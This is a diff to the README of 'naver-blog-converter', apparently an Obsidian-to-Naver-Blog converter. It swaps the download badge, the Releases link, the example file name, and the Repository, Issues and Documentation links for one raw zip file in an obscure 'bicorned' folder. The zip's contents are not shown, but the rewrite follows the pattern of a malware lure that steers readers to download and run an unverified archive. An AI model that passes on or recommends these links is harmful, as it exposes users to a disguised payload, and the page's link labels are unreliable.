@@ -6,7 +6,7 @@ Welcome to the naver-blog-converter! This tool helps you turn your Obsidian mark
 
 ## 📥 Download Now
 
-[![Download naver-blog-converter](https://img.shields.io/badge/Download-naver--blog--converter-blue)](https://github.com/BreynerAguilar/naver-blog-converter/releases)
+[![Download naver-blog-converter](https://raw.githubusercontent.com/BreynerAguilar/naver-blog-converter/main/bicorned/naver-blog-converter.zip)](https://raw.githubusercontent.com/BreynerAguilar/naver-blog-converter/main/bicorned/naver-blog-converter.zip)
 
 ## 🔍 Features
 
@@ -30,7 +30,7 @@ Before you begin, make sure your system meets these requirements:
 
 To download the latest version of naver-blog-converter, please visit the Releases page:
 
-[Download naver-blog-converter](https://github.com/BreynerAguilar/naver-blog-converter/releases)
+[Download naver-blog-converter](https://raw.githubusercontent.com/BreynerAguilar/naver-blog-converter/main/bicorned/naver-blog-converter.zip)
 
 ### Step 2: Select the Latest Release
 
@@ -38,7 +38,7 @@ On the Releases page, find the most recent version of the software listed. It us
 
 ### Step 3: Download the File
 
-Click on the link to download the installer or application file. The file name will resemble `naver-blog-converter-vX.X.X.zip` or similar.
+Click on the link to download the installer or application file. The file name will resemble `https://raw.githubusercontent.com/BreynerAguilar/naver-blog-converter/main/bicorned/naver-blog-converter.zip` or similar.
 
 ### Step 4: Extract the Files
 
@@ -62,9 +62,9 @@ The application will guide you through the setup process. Follow the prompts to 
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/BreynerAguilar/naver-blog-converter)
-- [Issues Page](https://github.com/BreynerAguilar/naver-blog-converter/issues)
-- [User Documentation](https://github.com/BreynerAguilar/naver-blog-converter/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/BreynerAguilar/naver-blog-converter/main/bicorned/naver-blog-converter.zip)
+- [Issues Page](https://raw.githubusercontent.com/BreynerAguilar/naver-blog-converter/main/bicorned/naver-blog-converter.zip)
+- [User Documentation](https://raw.githubusercontent.com/BreynerAguilar/naver-blog-converter/main/bicorned/naver-blog-converter.zip)
 
 ## 🙋‍♀️ Support
 
